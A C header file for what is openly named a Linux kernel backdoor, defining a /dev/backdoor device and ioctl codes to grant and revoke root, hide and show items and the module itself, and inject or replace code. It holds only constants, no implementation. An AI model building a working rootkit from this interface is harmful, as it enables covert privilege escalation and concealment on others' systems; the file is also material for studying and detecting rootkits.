#ifndef BDOOR_COMMON_LIB
#define BDOOR_COMMON_LIB 1
#include <asm/ioctl.h>

#ifndef __KERNEL__
#include <sys/types.h>
#endif

#define BDOOR_DEV_MINOR 42
#define BDOOR_DEV_NAME "backdoor"
#define BDOOR_DEV_PATH "/dev/backdoor"

//ioctls for our interface
#define ROOT_IOCTL         _IO('k', 1)
#define UNROOT_IOCTL       _IO('k', 2)
#define URAND_IOCTL        _IO('k', 3)
#define HIDE_IOCTL         _IO('k', 4)
#define SHOW_IOCTL         _IO('k', 5)
#define LIST_HIDDEN_IOCTL  _IO('k', 6)
#define INJECT_IOCTL       _IO('k', 7)
#define REPLACE_IOCTL      _IO('k', 8)
#define HIDE_MOD_IOCTL     _IO('k', 9)
#define SHOW_MOD_IOCTL     _IO('k', 10)

#endif
